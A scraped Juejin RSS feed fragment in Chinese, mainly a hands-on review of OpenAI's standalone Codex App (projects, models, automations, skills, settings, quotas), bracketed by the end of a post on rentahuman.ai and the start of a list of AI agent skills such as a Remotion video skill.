<p>这篇文章的核心，就是想要把 <code>rentahuman.ai</code>（包括 <code>moltbook</code>）这些 “东西” 给大家说清楚：</p>
<ul>
<li>这些玩意到底是什么</li>
<li>为什么会出现</li>
<li>会带来什么风险</li>
</ul>
<p>因为很多时候，我们会低估“门槛”这件事。</p>
<p>在很多程序员眼里的一句：“这不就是个 MCP server 吗”。但是到了另一些不熟悉的人严重，可能就是 “一堵墙”。甚至可能是会被 “带节奏” 的东西。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[上手Codex独立应用，双倍配额任你造！]]></title>    <link>https://juejin.cn/post/7602914378388570122</link>    <guid>https://juejin.cn/post/7602914378388570122</guid>    <pubDate>2026-02-05T04:44:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602914378388570122" data-draft-id="7602935146706173998" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="上手Codex独立应用，双倍配额任你造！"/> <meta itemprop="keywords" content="OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T04:44:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="甲维斯"/> <meta itemprop="url" content="https://juejin.cn/user/63109670111066"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            上手Codex独立应用，双倍配额任你造！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/63109670111066/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    甲维斯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:44:27.000Z" title="Thu Feb 05 2026 04:44:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>论 AI 编程，在我心中目前最能干的是 Claude Code 配合 Opus 4.5，而发挥最稳的是 Codex 配 GPT-5.2。</p>
<p>OpenAI 应该也是看到了这方面的前景，所以这两天推出了专门的 Codex App，为了推广 Codex 又给出了会员配额翻倍，免费用户也能体验的福利。</p>
<p>果然，这招也很奏效。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b651ce85ca654f039be0ad27d058a436~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=En44mT4yQsCnD4Fz8n7UhX3WQTY%3D" alt="" loading="lazy"/></p>
<p>刚发布 MetaGPT，活跃用户已经超过 100 万了。这就必须玩一下了，我们怎么可以落后呢？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd9051ce8d4d457dbae66286b4a167bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=vYImfQFQnnUUn9dq7tcw1wVRtlM%3D" alt="" loading="lazy"/></p>
<p>从初步体验来看，做得很简洁，但是已经考虑得非常全面，使用体验绝对比任何第三方插件都要好。它可能会成为一种全新的编程工具形式，自然也是一个电脑助手！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dfaad7464984c3a96126b06552c51f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=4nRhGfRHcrjgJSJbUoz3rzlZB0I%3D" alt="" loading="lazy"/></p>
<p>我们知道 Claude 已经在早些时候把 Code 集成到了桌面软件，而且也广受好评，但它还是集成在主程序里面；而 OpenAI 则是直接把它拎出来作为一个单独的程序，所以这个意义还是不一样的。</p>
<p>从功能布局，参数设置，交互流程来看，应该也是深思熟虑之后的结果。</p>
<p>我们可以通过它的整个安装过程、界面设置，以及包含的参数，来感受一下这款产品的思路。</p>
<p>软件安装是很简单的，没有什么好讲，安装完成之后，第一个步骤是需要选择一个文件夹作为项目。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37537ed1c8c848bd951bebd8bc34a597~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=nA1wZ9UUF%2BtXT9oiiEHLPRNJspU%3D" alt="" loading="lazy"/></p>
<p>上面有提到了，Codex 会在选中的项目中进行读写和运行。然后下方列出了一些项目，这些其实就是我之前在 Codex CLI 中用过的项目。它自动识别出来了，作为候选让我选择。可以全选，也可以选择其中一个。</p>
<p>进来之后的主界面是这样的：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dd03d988d1a45fc885a92b47cc93343~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=5IgpObjLal3CXE6c%2BQ6L4UvYiEI%3D" alt="" loading="lazy"/></p>
<p>整个布局其实和 GPT-5 有点像：</p>
<ol start="0">
<li>左边是项目</li>
<li>右边是对话</li>
<li>下方是输入</li>
</ol>
<p>主要差别在于普通的 GPT 里面叫对话，但是在 Codex App 里面叫 Thread。而且这里的模型选择会更加丰富，有专门的 Codex 模型可以选择。</p>
<p>模型包含了 GPT-5.2 Codex（分为 High、Medium、Extra-High）以及 GPT-5.2（分为 Medium、High、Extra-High）等型号。</p>
<p>底下还可以选择在 Local、Worktree、Cloud 等模式场景下使用，既然有这些东西，肯定是支持版本管理的。</p>
<p>右上角还有个终端图标，可以直接打开终端。</p>
<p>这个界面还有三大功能：</p>
<ol start="0">
<li>自动化</li>
<li>技能</li>
<li>设置</li>
</ol>
<p><strong>自动化</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e681404c4594f88a0731d4569e089a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=u%2FPF2MqgiUgwy24mELFsP5vJ2y4%3D" alt="" loading="lazy"/></p>
<p>里面已经有 9 条推荐的自动化内容：</p>
<ol start="0">
<li>扫描最近的代码提交，找出可能的 Bug，并给出最小修改建议</li>
<li>基于已合并的 PR 自动生成每周发布说明（包含链接）</li>
<li>汇总昨天的 Git 活动，用于每日站会</li>
<li>汇总最近一次 CI 中的失败和不稳定测试，并给出优先修复建议</li>
<li>创建一个范围极小的经典小游戏</li>
<li>根据最近的 PR 和代码评审，推荐下一步值得深入的技能方向</li>
<li>整合本周的 PR、发布、事故和评审，生成一份周报</li>
<li>对比近期的性能基准或 Trace 变化，提前发现性能回退问题</li>
<li>检测依赖库或 SDK 的版本漂移，并提出最小对齐方案</li>
</ol>
<p>这些是自动化开发相关的任务，底部还可以探索更多的任务，右上角可以新建任务。</p>
<p><strong>技能</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfc3957db110407bbc04dc5ba1697e45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=bZ6rTEKNQ05tS0tbFEBcYjuvcpY%3D" alt="" loading="lazy"/></p>
<p>除了自动化之外，还包含了大量的技能。</p>
<p>技能就相当于最近最火的概念，Codex 里面已经内置了很多实用的技能。同时也可以自己创建起来。</p>
<p>创建方式也非常自由：</p>
<ol start="0">
<li>可以直接 new skills</li>
<li>可以直接在对话中创建</li>
<li>也可以当你做完某件事情之后，让它把这个行为固化成技能</li>
</ol>
<p><strong>设置</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d33dcafa8e042639a5b3d90db7969b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=E1izNuXsSfuFU72L3PukkwgeRqI%3D" alt="" loading="lazy"/></p>
<p>设置界面包含了：</p>
<ol start="0">
<li>常规</li>
<li>配置</li>
<li>个性化</li>
<li>MCP 服务</li>
<li>版本管理</li>
<li>环境变量</li>
<li>Worktree</li>
<li>存档 Threads</li>
</ol>
<p>这里面还包含了大量的子选项可进行设置！基本开发相关的，该考虑的都考虑得差不多了。</p>
<p>配置里面可以设置询问策略和沙盒模式，安全感满满。</p>
<p>看完基础功能之后，我做一个简单的测试。</p>
<p>测试内容就是让他自己写一篇文章，来介绍 Codex App。然后再把交流过程中的写文章要点，制作成一个 skill。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b89d8a30299a4f5faf7d919abf31caed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=fwhmpHUtBIBH5i2rsOPD7ezb33w%3D" alt="" loading="lazy"/></p>
<p>然后把这个技能抽象出来，作为一个通用技能。</p>
<p>以后只要有类似的产品发布，你只需要给它一个关键词，它就会自动检索相关的文档、新闻和用户评价，并基于这些内容写一篇面向读者的文章。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad57520037ec4eb3a8b54a6a7a69fc12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=wq5qfiL7KQISPaogCzxP%2FTRyJ1s%3D" alt="" loading="lazy"/></p>
<p>Codex App 会自动创建任务列表，然后自动完成、自动打勾。技能创建完成之后，它会自动帮你安装到指定的路径。</p>
<p>然后在软件的技能界面刷新一下，也可以看到自己创建的技能。</p>
<p>技能的使用方式分三种：</p>
<ol start="0">
<li>在技能页面直接点击</li>
<li>在上下文中直接调用</li>
<li>通过 $ 符号选择技能</li>
</ol>
<p>玩起来非常简单！</p>
<p>最关键的是开头说的：<strong>配额充足啊</strong>。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79205c55f0804dfb9c4c482b15b4c0da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=ZBo0Ljh33MiIIq5Ep6E2dYjpm1c%3D" alt="" loading="lazy"/></p>
<p>我查询了一堆资料，然后又对大量文章进行了总结，还更新了一个技能。<strong>配额只少了 3%。还有 97%，没多久又要变成 100% 了，满满的安全感！</strong></p>
<p>Codex 其实早就默默地加量了，血槽非常厚，翻倍之后，就更爽了！</p>
<p>就像 Claude Code 摇身一变变成了 Claude CoWork，其实 Codex App 也不单单是 Code 而已，它其实可以做大量的工作。分析和整理文件这种肯定是小意思了。先进行网络检索，然后再整理成文档或文章，这个应用场景其实也蛮好的。然后配合各种自动化和技能，其实它可以处理比较复杂的事情。</p>
<p>当然它的核心本质工作就是编程。相比于单纯的 Codex 终端形式，Codex 有了界面之后真的是方便太多了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03d3599e5c554a63aebf8a83ef94549b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sy57u05pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770871466&amp;x-signature=3ZTxR4RGoGifkh4r5faKBnxjmkE%3D" alt="" loading="lazy"/></p>
<p>可以非常方便地管理多个项目，</p>
<p>可以快速查看修改过的所有文件，以及文件里的内容。</p>
<p>另外还可以很方便地回退到上一轮对话的版本。</p>
<p>右上角还有一个一键运行的按钮，可以自己管理运行命令。</p>
<p>现在终于可以一边对话，一边启动服务了。互不影响了！！！</p>
<p>但是，慢是真的有点慢～～！</p>
<p>万物守恒定律：有好处必然有坏处，有坏处必然有好处。</p>
<p>我们就要抓住它的好处，趁着免费也可以玩，收费量超足的时候，玩个痛快。</p>
<p>快速上手，快速学习，快速判断是否对你有帮助。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GitHub这 6 个超神的 SKills，赶紧收藏]]></title>    <link>https://juejin.cn/post/7602929352716468224</link>    <guid>https://juejin.cn/post/7602929352716468224</guid>    <pubDate>2026-02-05T05:42:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602929352716468224" data-draft-id="7602901195154161716" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GitHub这 6 个超神的 SKills，赶紧收藏"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-02-05T05:42:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GitHub这 6 个超神的 SKills，赶紧收藏
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:42:35.000Z" title="Thu Feb 05 2026 05:42:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>01</p>
<p><strong>视频制作：Remotion Skill</strong></p>
<p>不知道大家有没有用过 Remotion 这个开源项目，现在也有 2.8 万的 Star 了。之前我想做视频生成自动化的时候，了解过 Remotion。它其实是一个用 React 编程来制作视频的框架。比如下面这种视频，都可以使用 **Remotion 框架制作。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12a089fa3fea4144bb5ce0709d1a7636~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=KyEbdti2KHabvk1mvLmmOO71bVw%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db74611e8614a6dbd564ae7aea60499~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=5kD0kt2e7KQq5inmsmhiDdDVIg8%3D" alt="图片" loading="lazy"/></p>
<p>最近 AI Skill 大火，Remotion 团队就推出了 remotion skills。</p>
<p>这个给 AI Agent 使用的技能包，可以教会 AI 如何正确、准确地使用 Remotion 框架来制作视频。</p>
<p>如果有条件，可以去 X 上看看，现在很多网友开始使用 remotion skills 来制作各种各样花里胡哨的视频了。</p>
<p>也有一些案例可查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FW7-olJj_QQdyYix1XP7ZeQ" target="_blank" title="https://mp.weixin.qq.com/s/W7-olJj_QQdyYix1XP7ZeQ" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/W7-olJj_Q…</a></p>
<p>这个开源的 skill 确实指的单独一篇文章，有空详细讲讲。</p>
<p>你可以通过下面命令安装这个 skill：</p>
<pre><code class="hljs language-bash" lang="bash">npx skills add remotion-dev/skills
</code></pre>
<p>原理其实是将 Remotion 的官方文档、API 规范和最佳实践封装成 AI 可读取的 Context，让 AI 成为更懂 Remotion 的视频制作助手。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/remotion-dev/skills</span>
</code></pre>
<p>02</p>
<p><strong>YouTube 视频剪辑 Skill</strong></p>
<p>Youtube-clipper-skill 是 AI 大佬开源的一个 YouTube 视频剪辑 Skill。</p>
<p>丢个 YouTube 的链接，它能自动完成环境检查、下载、语义分析、剪辑以及生成双语字幕文件，可以从长视频中提取精华片段。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e2f2e23e62b438e8d94e574c22cd760~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=inMLrrbNHKJiNsRTO6GJDGtscws%3D" alt="图片" loading="lazy"/></p>
<p>它不是机械地按时间切割视频，而是利用 Claude 的 AI 能力对视频字幕进行语义分析，自动生成有用的视频切片。</p>
<p>这个开源项目项目集成了 yt-dlp 和 FFmpeg 底层工具，能够实现高质量的视频下载与处理。</p>
<p>它具备强大的字幕处理能力，支持将字幕批量翻译为中英双语格式，并能将双语字幕录入视频画面中。</p>
<p>翻译功能进行了优化，通过批量处理能显著减少 API 调用次数并提升翻译一致性。</p>
<p>而且它能够自动生成适用于小红书、抖音或微信等平台的视频摘要和素材。</p>
